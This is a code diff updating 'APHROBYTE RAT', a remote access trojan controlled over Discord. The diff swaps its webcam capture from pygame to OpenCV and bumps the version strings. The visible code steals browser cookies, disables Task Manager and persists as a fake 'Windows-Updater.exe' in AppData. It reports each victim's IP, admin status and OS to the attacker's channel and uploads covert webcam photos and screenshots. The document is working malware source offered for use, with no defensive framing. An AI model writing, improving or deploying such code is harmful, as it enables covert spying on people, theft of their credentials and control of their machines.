@@ -1,4 +1,4 @@
-import pyautogui, pygame, pygame.camera, time, discord, os, json, psutil, ctypes, rotatescreen as rs, win32api as win32, win32con, sys, winreg, subprocess, random, socket, pyperclip, tkinter as tk, tkinter.messagebox, browser_cookie3, re, inspect, urllib, platform, shutil, base64,codecs,zlib
+import pyautogui, cv2, time, discord, os, json, psutil, ctypes, rotatescreen as rs, win32api as win32, win32con, sys, winreg, subprocess, random, socket, pyperclip, tkinter as tk, tkinter.messagebox, browser_cookie3, re, inspect, urllib, platform, shutil, base64,codecs,zlib
 from discord.ext import commands
 from urllib import request
 from ctypes import Structure, windll, c_uint, sizeof, byref
@@ -6,6 +6,7 @@ from PIL import ImageTk,Image
 
 client = commands.Bot(command_prefix='^',intents=discord.Intents.all())
 client.remove_command("help")
+
 ### CONFIGURATION
 
 token = "{token}"
@@ -23,10 +24,6 @@ cookies = ""
 ### CODE
 
 installationpath = sys._MEIPASS if getattr(sys, 'frozen', False) else os.path.dirname(os.path.abspath(__file__))
-
-pygame.init()
-pygame.camera.init()
-camlist = pygame.camera.list_cameras()
 
 def admincheck():
     val = ctypes.windll.shell32.IsUserAnAdmin()
@@ -162,7 +159,7 @@ def disable_task_manager():
         winreg.CloseKey(reg_key)
         return True
     except WindowsError as e:
-        return False
+        return e
 
 def enable_task_manager():
     registry_path = "SOFTWARE\Microsoft\Windows\CurrentVersion\Policies\System"
@@ -175,7 +172,7 @@ def enable_task_manager():
         winreg.CloseKey(reg_key)
         return True
     except WindowsError as e:
-        return False
+        return e
 
 @client.event
 async def on_ready():
@@ -185,7 +182,6 @@ async def on_ready():
         ipaddress = ldata['IPv4']
     if autostart != False:
         path = sys.argv[0]
-        appdata = os.environ["appdata"]
         if (sys.argv[0].endswith("exe")):
             backdoor_location = os.environ["appdata"] + "\\Windows-Updater.exe"
             if not os.path.exists(backdoor_location):
@@ -201,7 +197,7 @@ async def on_ready():
     await channel.send(f"""
 ||@everyone|| The RAT has sniped :flag_{cflag.lower()}: **{user}** :flag_{cflag.lower()}: with desktop ID **{host_id}**.
 
-``` APHROBYTE RAT v1.9 | {client.user.name} | RIOT ADMINISTRATION ```
+``` APHROBYTE RAT v1.9.1 | {client.user.name} | RIOT ADMINISTRATION ```
 
 :skull_crossbones: `->` IP Address : ||{ipaddress}|| <- :flag_{cflag.lower()}:
 :skull_crossbones: `->` Admin privileges : **{admincheck()}**
@@ -209,14 +205,14 @@ async def on_ready():
 :skull_crossbones: `->` OS : **{platform.system()} {platform.release()}**
 :skull_crossbones: `->` Usage ID : ||{clientid}||
 
-``` APHROBYTE RAT v1.9 | {client.user.name} | RIOT ADMINISTRATION ```
+``` APHROBYTE RAT v1.9.1 | {client.user.name} | RIOT ADMINISTRATION ```
 
 Help menu : **^help ||{clientid}||**
 Get list of active users : **^usagelist**
 
 RAT installed in : `{installationpath}`
 
-**__USER SCREEN__** :point_down::point_down::point_down::point_down::point_down::point_down::point_down::point_down::point_down:
+:point_down: **__USER SCREEN__** :point_down:
 """, file=discord.File(path))
     os.remove(path)
     print(f'{client.user} is now online! Clientid {clientid}')
@@ -402,18 +398,31 @@ async def forcedesktop(ctx, *, usid):
 @client.command()
 async def webcam_capture(ctx, *, usid):
     if usid == clientid:
-        pygame.camera.init()
-        camlist = pygame.camera.list_cameras()
-        if camlist:
-            for i in range(len(camlist)):
-                cam = pygame.camera.Camera(camlist[i], (640, 480))
-                cam.start()
-                image = cam.get_image()
-                pygame.image.save(image, f"cameracapture({i}).jpg")
-                file = discord.File(f"cameracapture({i}).jpg")
-                await ctx.send(f"Camera **{i+1}** for **{os.getlogin()}**", file=file)
-        elif not camlist:
-            await ctx.send(f"No cameras available for **{os.getlogin()}**.")
+        camera_count = cv2.getBuildInformation().count("Video I/O")
+        if camera_count == 0:
+            await ctx.send(f"No cameras found for **{os.getlogin()}**.")
+            return
+            
+        cam_number = 0
+        for camera_index in range(camera_count):
+            camera = cv2.VideoCapture(camera_index)
+            success, frame = camera.read()
+            if success:
+                cam_number = cam_number + 1
+                image_path = f"camera_{camera_index}.jpg"
+                cv2.imwrite(image_path, frame)
+
+                with open(image_path, "rb") as file:
+                    picture = discord.File(file, filename=image_path)
+                    embed = discord.Embed(color=discord.Color.green())
+                    embed.set_image(url=f"attachment://{image_path}")
+                    await ctx.send(content=f"**{os.getlogin()}**'s webcam - **Camera {str(cam_number)}**",embed=embed, file=picture)
+
+                os.remove(image_path)
+
+            camera.release()
+        if cam_number == 0:
+            await ctx.send(f"**{os.getlogin()}** has no webcam available.")
     
 @client.command()
 async def blockscreen(ctx, *, usid):
@@ -442,7 +451,7 @@ async def messmouse(ctx, *, usid):
 
 @client.command()
 async def usagelist(ctx):
-    list_usage = f"Active : **{os.getlogin()}** with desktop ID **{socket.gethostname()}** and usage ID **{clientid}**. Admin privileges : **{admincheck()}** `v1.9`"
+    list_usage = f"Active : **{os.getlogin()}** with desktop ID **{socket.gethostname()}** and usage ID **{clientid}**. Admin privileges : **{admincheck()}** `v1.9.1`"
     await ctx.send(list_usage)
 
 @client.command()
